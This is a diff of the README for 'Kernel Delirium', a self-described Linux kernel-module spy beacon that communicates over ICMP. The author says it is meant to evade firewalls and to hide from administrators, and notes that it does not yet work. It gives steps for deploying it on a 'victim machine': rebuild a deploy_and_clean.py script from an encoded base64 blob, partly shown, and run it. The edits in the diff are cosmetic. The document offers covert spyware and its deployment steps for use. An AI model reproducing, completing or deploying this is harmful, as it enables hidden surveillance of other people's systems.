@@ -1,14 +1,14 @@
-# Kernel Delirium :smoking: (Not working yet, still requires development)
+# Kernel Delirium :smoking: :penguin: (Not working yet, still requires development)
 
 ## What is it about
 
-My idea was to create a kernel module for linux machine which is basically a beacon to spy on machine using ICMP protocoll which is usually less suspicious then tcp/udp f.ex, so even some firewalls don't mind. Additionally inexperienced System admin is not gonna try to look it up in kernel modules. Maybe in future to hide it better, I'll include the module in the system one
+My idea was to create a kernel module for linux machine which is basically a beacon to spy on machine using ICMP protocoll which is usually less suspicious then tcp/udp f.ex, so even some firewalls don't mind. Additionally inexperienced System admin is not gonna try to look it up in kernel modules. Maybe in future to hide it better, I'll include the module in the system one.
 
 ## How to use?
 
-To use this software you should install a desktop app and run deploy_and_clean.py (I recommend to assemble file with base64)on the victim machine
+To use this software you should install a desktop app and run deploy_and_clean.py (I recommend to assemble file with base64) on the victim machine cause that's more time efficient.
 
-### Victim machine :syringe:
+### Victim machine :syringe: :computer:
 
 ```bash
 base64 -d aW1wb3J0IG9zCmltcG9ydCBhcmdwYXJzZQoKI21vZHVsZV9uYW1lIGlzIG5lZWRlZCB0byBoaWRl
@@ -57,7 +57,7 @@ X19tYWluX18iOgogICAgbWFpbigpCg== > deploy_and_clean.py`
 ```python
 python3 deploy_and_clean.py`
 ```
-### Your machine :computer:
+### Your machine :man_technologist:
 ```bash
 apt-get install kernel-delirium (Not gonna work yet)
 ```
